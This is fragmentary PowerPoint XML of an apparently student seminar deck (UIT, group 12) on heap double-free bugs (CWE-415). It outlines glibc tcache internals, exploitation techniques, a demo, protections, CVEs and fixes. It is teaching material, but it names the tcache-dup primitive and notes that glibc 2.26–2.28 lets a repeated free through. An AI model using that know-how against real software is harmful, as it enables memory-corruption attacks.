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37444ecb-cb42-f0a2-4213-59cfc0164bc4}">
          <p14:sldIdLst>
            <p14:sldId id="256"/>
            <p14:sldId id="257"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="01 Nền tảng bộ nhớ" id="{ebc48980-349e-880d-a26a-36561186bb67}">
          <p14:sldIdLst>
            <p14:sldId id="258"/>
            <p14:sldId id="259"/>
            <p14:sldId id="260"/>
            <p14:sldId id="261"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="02 Arenas" id="{a383529f-244c-1cab-71c1-21288d4b6dc6}">
          <p14:sldIdLst>
            <p14:sldId id="262"/>
            <p14:sldId id="263"/>
            <p14:sldId id="264"/>
            <p14:sldId id="265"/>
            <p14:sldId id="266"/>
            <p14:sldId id="267"/>
            <p14:sldId id="268"/>
            <p14:sldId id="269"/>
            <p14:sldId id="270"/>
            <p14:sldId id="271"/>
            <p14:sldId id="272"/>
            <p14:sldId id="273"/>
            <p14:sldId id="274"/>
            <p14:sldId id="275"/>
            <p14:sldId id="276"/>
            <p14:sldId id="277"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="03 Lỗ hổng Double Free" id="{461ca292-d7b8-6c8a-d703-dbeb3d76b0da}">
          <p14:sldIdLst>
            <p14:sldId id="278"/>
            <p14:sldId id="279"/>
            <p14:sldId id="280"/>
            <p14:sldId id="281"/>
            <p14:sldId id="282"/>
            <p14:sldId id="283"/>
            <p14:sldId id="284"/>
            <p14:sldId id="285"/>
            <p14:sldId id="286"/>
            <p14:sldId id="287"/>
            <p14:sldId id="288"/>
            <p14:sldId id="289"/>
            <p14:sldId id="290"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="04 Kỹ thuật khai thác" id="{48d4b974-da62-92bb-9f34-1fcd0d7fd12a}">
          <p14:sldIdLst>
            <p14:sldId id="291"/>
            <p14:sldId id="292"/>
            <p14:sldId id="293"/>
            <p14:sldId id="294"/>
            <p14:sldId id="295"/>
            <p14:sldId id="296"/>
            <p14:sldId id="297"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="05 Demo" id="{2c8a30fd-a1da-b360-cba0-dab61e45c238}">
          <p14:sldIdLst>
            <p14:sldId id="298"/>
            <p14:sldId id="299"/>
            <p14:sldId id="300"/>
            <p14:sldId id="301"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="06 Điều kiện và cơ chế bảo vệ" id="{7c482ca5-6e7e-9dfc-c8b9-306568d6e868}">
          <p14:sldIdLst>
            <p14:sldId id="302"/>
            <p14:sldId id="303"/>
            <p14:sldId id="304"/>
            <p14:sldId id="305"/>
            <p14:sldId id="306"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="07 CVE thực tế" id="{30cd03af-2d8d-ca97-dec1-1388a15e1b34}">
          <p14:sldIdLst>
            <p14:sldId id="307"/>
            <p14:sldId id="308"/>
            <p14:sldId id="309"/>
            <p14:sldId id="310"/>
            <p14:sldId id="311"/>
            <p14:sldId id="312"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="08 Khắc phục và phòng ngừa" id="{b7e06d13-f1cb-bb7d-3f76-7752d7f63866}">
          <p14:sldIdLst>
            <p14:sldId id="313"/>
            <p14:sldId id="314"/>
            <p14:sldId id="315"/>
            <p14:sldId id="316"/>
            <p14:sldId id="317"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="Kết" id="{8346b0ad-46d3-f366-c104-7774dcd764f2}">
          <p14:sldIdLst>
            <p14:sldId id="318"/>
            <p14:sldId id="319"/>
            <p14:sldId id="32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C0E0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C0E0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3063240"/>
            <a:ext cx="6949440" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0"/>
          <a:lstStyle>
            <a:lvl1pPr indent="0" marL="0">
              <a:buNone/>
              <a:defRPr lang="en-US" sz="4400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="4400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="body" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4343400"/>
            <a:ext cx="6949440" cy="11887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4" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6400800"/>
            <a:ext cx="731520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SEMINAR · LẬP TRÌNH AN TOÀN · CWE-415 · NHÓM 12</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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0C0E0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rtlCol="0"/>
          <a:lstStyle>
            <a:lvl1pPr indent="0" marL="0">
              <a:buNone/>
              <a:defRPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6400800"/>
            <a:ext cx="7315200" cy="27432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SEMINAR · LẬP TRÌNH AN TOÀN · CWE-415 · NHÓM 12</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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hyperlink" Target="https://nhan-laptop.github.io/posts/malware-binary/learning-Malware-for-beginner-part-1.html" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://hacktricks.wiki/en/binary-exploitation/libc-heap/double-free.html" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://hacktricks.wiki/en/binary-exploitation/libc-heap/bins-and-memory-allocations.html" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://hacktricks.wiki/en/binary-exploitation/libc-heap/tcache-bin-attack.html" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/www-community/vulnerabilities/Doubly_freeing_memory" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.geeksforgeeks.org/operating-systems/memory-management-in-operating-system/" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/shellphish/how2heap" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://sourceware.org/glibc/wiki/MallocInternals" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://corgi.rip/posts/leakless_heap_1/" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cwe.mitre.org/data/definitions/415.html" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cwe.mitre.org/data/definitions/416.html" TargetMode="External"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://nvd.nist.gov/vuln/detail/CVE-2026-33824" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://nvd.nist.gov/vuln/detail/CVE-2026-23918" TargetMode="External"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://nvd.nist.gov/vuln/detail/CVE-2025-62215" TargetMode="External"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-33824" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.thezdi.com/blog/2026/4/22/cve-2026-33824-remote-code-execution-in-windows-ikev2" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://httpd.apache.org/security/vulnerabilities_24.html" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rescana.com/post/critical-apache-http-server-2-4-66-vulnerability-cve-2026-23918-http-2-mod-http2-double-free-enables-dos-and-remote-code" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" TargetMode="External"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://elixir.bootlin.com/glibc/glibc-2.26/" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/bminor/glibc/blob/glibc-2.27/malloc/malloc.c" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout4.xml"/><Relationship Id="rId2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457200"/>
            <a:ext cx="7223760" cy="5943600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1231"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="822960"/>
            <a:ext cx="658368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SEMINAR // LẬP TRÌNH AN TOÀN // CWE-415</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1463040"/>
            <a:ext cx="6675120" cy="2926080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="6000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Heap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="6000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="6000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Double Free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="6000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="6000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="6000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4526280"/>
            <a:ext cx="6583680" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lỗi giải phóng cùng một vùng nhớ nhiều lần làm sai lệch trạng thái quản lý heap. Trọng tâm: nguyên nhân, tác động, và cách bảo đảm mỗi vùng nhớ chỉ được giải phóng đúng một lần.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5897880"/>
            <a:ext cx="4572000" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>NHÓM 12 · UIT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7909560" y="457200"/>
            <a:ext cx="3822192" cy="3931920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1914"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="685800"/>
            <a:ext cx="3383280" cy="27432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tcache bin 0x100 · glibc 2.27</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8183880" y="1143000"/>
            <a:ext cx="2834640" cy="86868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i · user data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8183880" y="2240280"/>
            <a:ext cx="2834640" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>h · next → h</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8183880" y="3337560"/>
            <a:ext cx="2834640" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>h · next → h</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="11292840" y="2697480"/>
            <a:ext cx="0" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11018520" y="3566160"/>
            <a:ext cx="274320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11018520" y="2697480"/>
            <a:ext cx="274320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7909560" y="4617720"/>
            <a:ext cx="1828800" cy="1783080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4103"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8092440" y="4782312"/>
            <a:ext cx="1463040"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GLIBC 2.26–2.28</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8092440" y="5074920"/>
            <a:ext cx="1463040" cy="41148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tcache dup</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8092440" y="5532120"/>
            <a:ext cx="1463040" cy="758952"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>free(a); free(a) lọt ngay</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9966960" y="4617720"/>
            <a:ext cx="1764792" cy="1783080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4145"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10149840" y="4782312"/>
            <a:ext cx="1399032" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>GLIBC ≥ 2.29</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10149840" y="5074920"/>
            <a:ext cx="1399032" cy="1216152"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free(): double free detected in tcache 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Nội dung bám theo 8 yêu cầu của đề</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MỤC LỤC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="2647188" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1581912"/>
            <a:ext cx="2281428"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YÊU CẦU 1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1874520"/>
            <a:ext cx="2281428" cy="73152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Khái niệm, nguyên lý, điều kiện phát sinh</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2651760"/>
